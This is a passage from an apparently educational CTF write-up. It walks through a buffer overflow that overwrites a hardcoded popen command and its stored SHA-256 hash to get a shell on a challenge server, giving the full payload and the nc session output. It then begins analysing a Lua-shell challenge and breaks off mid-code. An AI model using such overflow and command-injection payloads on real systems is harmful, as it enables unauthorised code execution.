rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  FILE *v9; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-308h]</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-300h]</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-2F8h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+110h] [rbp-1F8h]</span></span><br><span class="line">  _BYTE v15[<span class="number">5</span>]; <span class="comment">// [rsp+12Bh] [rbp-1DDh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+16Ch] [rbp-19Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+18Ch] [rbp-17Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+1CCh] [rbp-13Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1D0h] [rbp-138h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v20; <span class="comment">// [rsp+2D8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v20 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">PREPARE</span>(&amp;dest);</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  lineptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">getline</span>(&amp;lineptr, (<span class="keyword">size_t</span> *)&amp;v11, stdin) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">strrchr</span>(lineptr, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  *v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="keyword">unsigned</span> __int8 *)&amp;v16;</span><br><span class="line">  v5 = &amp;v17;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, lineptr);</span><br><span class="line">  <span class="built_in">SHA256</span>((__int64)&amp;dest, &amp;v16, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *v4;</span><br><span class="line">    v7 = (<span class="keyword">char</span> *)v5;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">snprintf</span>(v7, <span class="number">3uLL</span>, <span class="string">&quot;%02x&quot;</span>, v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != &amp;v18 );</span><br><span class="line">  v8 = <span class="built_in">strcmp</span>(v15, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v17);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong password!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">popen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v14, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">fgets</span>(&amp;s, <span class="number">256</span>, v9) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">fclose</span>(v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>PREPARE</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_E60</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v_14[<span class="number">26</span>]; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+1Ah] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(a1, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v_14, <span class="string">&quot;/bin/cat ./secret_data.asc&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(v_14));</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    a1 + <span class="number">256</span>,</span><br><span class="line">    <span class="number">0x1B</span>uLL,</span><br><span class="line">    <span class="string">&quot;%s&quot;</span>,</span><br><span class="line">    v_14,</span><br><span class="line">    *(_QWORD *)v_14,</span><br><span class="line">    *(_QWORD *)&amp;v_14[<span class="number">8</span>],</span><br><span class="line">    *(_QWORD *)&amp;v_14[<span class="number">16</span>],</span><br><span class="line">    *(_QWORD *)&amp;v_14[<span class="number">24</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(a1 + <span class="number">283</span>, <span class="number">0x41</span>uLL, <span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>SHA256</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_DD0</span><span class="params">(__int64 a1, _QWORD *a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// er12</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  *a2 = <span class="number">0LL</span>;</span><br><span class="line">  a2[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a2[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  a2[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">SHA256_Init</span>(&amp;v5);</span><br><span class="line">  <span class="built_in">SHA256_Update</span>((__int64)&amp;v5, a1, v3);</span><br><span class="line">  <span class="built_in">SHA256_Final</span>((__int64)a2, (__int64)&amp;v5);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>I edited some functions’ name and even changed some variables’ declaration in IDA to simplify the main logic.</p>
+<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>The program reads input and do <code>sha256</code> hash, then compare it with stored hash. If they are equal, a command will be executed.</p>
+<p>The stored hash (<code>9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127</code>) and command (<code>/bin/cat ./secret_data.asc</code>) are both hardcoded, however it is not easy to unhash it, so we can overflow them as controlled content (sadly, cannot control program flow).</p>
+<p>In <code>main()</code> we input to <code>dest</code>, program calculates the <code>sha256</code> result as <code>v17</code> and compare it with <code>v15</code> (stored hash). Command is in <code>v14</code> and will be 1st parameter of <code>popen</code>. Imitating <code>PREPARE()</code> we write our payload:<br>payload = padding (<code>0x100</code>) + command (<code>0x1b</code>) + sha256(padding) (<code>0x40</code>)  </p>
+<p>Note: because it uses <code>popen</code> which essentially fork a process to execute, if we set command as <code>/bin/sh</code> we can’t receive interaction directly. But if we <code>exit</code> the <code>sh</code> we can get all output. </p>
+<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>Produce payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ipython</span><br><span class="line">...</span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> hashlib</span><br><span class="line">In [<span class="number">2</span>]: padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">In [<span class="number">3</span>]: payload = padding + <span class="string">&#x27;sh;&#x27;</span>.ljust(<span class="number">0x1B</span>,<span class="string">&#x27;b&#x27;</span>) + hashlib.sha256(padding).hexdigest()</span><br><span class="line">In [<span class="number">4</span>]: <span class="built_in">print</span> payload</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaash;bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe</span><br></pre></td></tr></table></figure>
+<p>And send payload:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ nc 220.249.52.133 41676</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaash;bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">sh: 1: bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe: not found</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag.txt</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">secret_file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ncat: Broken pipe.</span><br><span class="line">$ nc 220.249.52.133 41676</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaash;bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe</span><br><span class="line">cat flag.txt</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">sh: 1: bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe: not found</span><br><span class="line">cyberpeace&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Aul"><a href="#Aul" class="headerlink" title="Aul"></a>Aul</h2><p>Attachment: None.<br>Description: None.</p>
+<p>It is a <code>Lua</code> shell.</p>
+<h3 id="Information-3"><a href="#Information-3" class="headerlink" title="Information"></a>Information</h3><p>As it gives no binary, I can only know the program by interaction:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc 220.249.52.133 51731</span><br><span class="line"><span class="built_in">let</span><span class="string">&#x27;s play a game</span></span><br><span class="line"><span class="string">| 0 0 0 0 0 0 0 0 |</span></span><br><span class="line"><span class="string">| 0 1 0 0 0 0 4 0 |</span></span><br><span class="line"><span class="string">| 0 3 2 2 4 1 4 4 |</span></span><br><span class="line"><span class="string">| 0 3 2 3 2 3 4 3 |</span></span><br><span class="line"><span class="string">| 4 b 2 2 4 4 3 4 |</span></span><br><span class="line"><span class="string">| 3 2 4 4 1 1 2 2 |</span></span><br><span class="line"><span class="string">| 3 3 c d 3 3 2 3 |</span></span><br><span class="line"><span class="string">| 3 2 1 4 4 a 2 4 |</span></span><br><span class="line"><span class="string">qwer</span></span><br><span class="line"><span class="string">Didn&#x27;</span>t understand. Type <span class="string">&#x27;rotate&#x27;</span>, <span class="string">&#x27;rotate_left&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, or <span class="string">&#x27;help&#x27;</span>.</span><br></pre></td></tr></table></figure>
+<p>Use <code>rotate</code> and <code>rotate_left</code> to rotate the matrix in two directions, and use <code>help</code> we get:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">LuaS�</span><br><span class="line"></span><br><span class="line">xV(w@�,��,�,��,�,@��,��,���,�,@��,��,����CA�$@@C$@�&amp;�</span><br><span class="line">                                                                make_boardpopulate_boardboard_tostringfallrotatecrush</span><br><span class="line">                                            rotate_leftreadAllhelpquitexit       run_stepgame</span><br><span class="line">writelinelet&#x27;s play a game</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">   K@J��@@��</span><br><span class="line">               AF�@</span><br><span class="line">setmetatableA��J��@�f&amp;�size</span><br><span class="line">             __tostringboard_tostring&quot;</span><br><span class="line">                                            .�@���A@�@@$Ab@�����@RA, @��@�F�A���AB���Ad������</span><br><span class="line">@i���A�����h��@d���C�BC���</span><br><span class="line">��g��F�C�ef&amp;�sizemath</span><br><span class="line">                               randomseedipairsabcdmathrandomF@G@�������d���F��@�&amp;&amp;�mathrandom$/!K�@�@�@A�����BN�@��(B��A�������݁&#x27;�BA�A@�������$B�����@A���AA���&amp;�</span><br><span class="line">size| tableinsert |concat</span><br><span class="line">1D</span><br><span class="line">G@�@@��������N��(���@�$B&#x27;���&amp;�size</span><br><span class="line">                                                   make_board5=EN���@�@������������_@@�����������������N����&amp;���������FSG@��OCMÂGC�@&#x27;��@��&amp;�size�C�</span><br><span class="line">                                  make_boardUg</span><br><span class="line">$G@�@@��������A�A���@�N����(A����&#x27;��OA�N����(A�B�G�GB�@@����@����&#x27;��&amp;size</span><br><span class="line">                            make_boardabcdik      F@�@�@��ef&amp;�rotatemr</span><br><span class="line">          F@G@����d���������@��@�&amp;�ioopenrbread*allclosetx@@@F�@��d��$��F@A��@ǀ��d@&amp;�stringsubreadAll</span><br><span class="line">                                                     server.luac     writerawlen&#123;&#125;@@�&amp;�quit�-F@d���@@��@�����@���A�@����@@�@A�������@����@@�@A�������@����B�@���������B@������&amp;�</span><br><span class="line">                                                               readlinestringlenexitfind       functionprintloadreturn ��%@F@@��d$�F�@�A����@��d@F�A�d���A�@@�_�@���@BƀBAB@$�������@���@���&amp;�</span><br><span class="line">                                                               populate_board</span><br><span class="line">                                                                               make_board</span><br><span class="line">writelineboard_tostring</span><br><span class="line">       run_stepquitfallcrushEDidn&#x27;t understand. Type &#x27;rotate&#x27;, &#x27;rotate_left&#x27;, &#x27;exit&#x27;, or &#x27;help&#x27;.</span><br><span class="line">Didn&#x27;t understand. Type &#x27;rotate&#x27;, &#x27;rotate_left&#x27;, &#x27;exit&#x27;, or &#x27;help&#x27;.</span><br></pre></td></tr></table></figure>
+<p>It looks like <code>luac</code> – the opcode/bytecode of <code>Lua</code>. And if we enter number or something, we get:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc 220.249.52.133 51731</span><br><span class="line"><span class="built_in">let</span><span class="string">&#x27;s play a game</span></span><br><span class="line"><span class="string">| 0 0 0 0 0 0 0 0 |</span></span><br><span class="line"><span class="string">| 0 1 0 0 0 0 4 0 |</span></span><br><span class="line"><span class="string">| 0 3 2 2 4 1 4 4 |</span></span><br><span class="line"><span class="string">| 0 3 2 3 2 3 4 3 |</span></span><br><span class="line"><span class="string">| 4 b 2 2 4 4 3 4 |</span></span><br><span class="line"><span class="string">| 3 2 4 4 1 1 2 2 |</span></span><br><span class="line"><span class="string">| 3 3 c d 3 3 2 3 |</span></span><br><span class="line"><span class="string">| 3 2 1 4 4 a 2 4 |</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">lua Error: ?:-1: attempt to call a number value</span></span><br></pre></td></tr></table></figure>
+<p>So it is definitely a <code>Lua</code> shell.</p>
+<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>Questioner wants us to decompile <code>luac</code> file, but the result of <code>help</code> gives us a broken one, with its header lack of 1 byte. </p>
+<p>The head of <code>luac</code> file should be <code>1b 4c 75 61</code>, so we have to fix it and use <code>unluac</code> or <code>luadec</code> to decompile it. The result of it should be like:</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- http://www.playwithlua.com/?p=28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_board</span><span class="params">(size)</span></span></span><br><span class="line">   <span class="keyword">local</span> board = &#123; size = size &#125;</span><br><span class="line">   <span class="built_in">setmetatable</span>(board, &#123; <span class="built_in">__tostring</span> = board_tostring &#125;)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n = <span class="number">0</span>, size * size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      board[n] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">populate_board</span><span class="params">(board, filled, seed)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">if</span> seed <span class="keyword">then</span> <span class="built_in">math</span>.<span class="built_in">randomseed</span>(seed) <span class="keyword">end</span></span><br><span class="line">   filled = filled <span class="keyword">or</span> size * size * <span class="number">3</span> / <span class="number">4</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">rand</span><span class="params">()</span></span></span><br><span class="line">      <span class="keyword">local</span> c</span><br><span class="line">      <span class="keyword">repeat</span> c = <span class="built_in">math</span>.<span class="built_in">random</span>(size * size) - <span class="number">1</span> <span class="keyword">until</span> board[c] == <span class="number">0</span></span><br><span class="line">      <span class="keyword">return</span> c</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> filled &gt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">for</span> _,v <span class="keyword">in</span> <span class="built_in">ipairs</span>&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125; <span class="keyword">do</span> board[rand()] = v <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> n = <span class="number">1</span>, filled<span class="number">-4</span> <span class="keyword">do</span></span><br><span class="line">         board[rand()] = <span class="built_in">math</span>.<span class="built_in">random</span>(<span class="number">4</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> fall(board)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">board_tostring</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> <span class="built_in">lines</span> = &#123;&#125;</span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">for</span> y = <span class="number">0</span>, size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">local</span> line = <span class="string">&quot;|&quot;</span></span><br><span class="line">      <span class="keyword">for</span> x = <span class="number">0</span>, size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">         line = line .. <span class="string">&quot; &quot;</span> .. board[x+y*size]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      <span class="built_in">table</span>.<span class="built_in">insert</span>(<span class="built_in">lines</span>, line .. <span class="string">&quot; |&quot;</span>)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(<span class="built_in">lines</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fall</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fall_column</span><span class="params">(col)</span></span></span><br><span class="line">      <span class="keyword">local</span> dest = size - <span class="number">1</span></span><br><span class="line">      <span class="keyword">for</span> y = size<span class="number">-1</span>, <span class="number">0</span>, <span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">         <span class="keyword">if</span> board[y*size + col] ~= <span class="number">0</span> 